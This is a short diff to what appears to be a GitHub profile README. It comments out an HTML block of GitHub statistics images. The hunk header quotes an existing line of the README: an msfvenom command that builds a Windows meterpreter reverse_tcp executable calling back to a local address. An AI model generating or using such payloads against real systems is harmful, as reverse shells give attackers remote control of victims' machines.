@@ -21,10 +21,10 @@ msfvenom -p windows/meterpreter/reverse_tcp lport=1111 lhost=192.168.0.1 -f exe 
 <br>
 <h2 align="center">🍵 Statistics</h2>
 
-<div>
+<!-- <div>
     <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=FUBUKINGFOX&layout=compact&theme=dark" alt="my github stats" height="170">
     <img src="https://github-readme-stats.vercel.app/api?username=FUBUKINGFOX&theme=dark" alt="my github stats" height="170"/>
-</div>
+</div> -->
 
 ### Skills
 
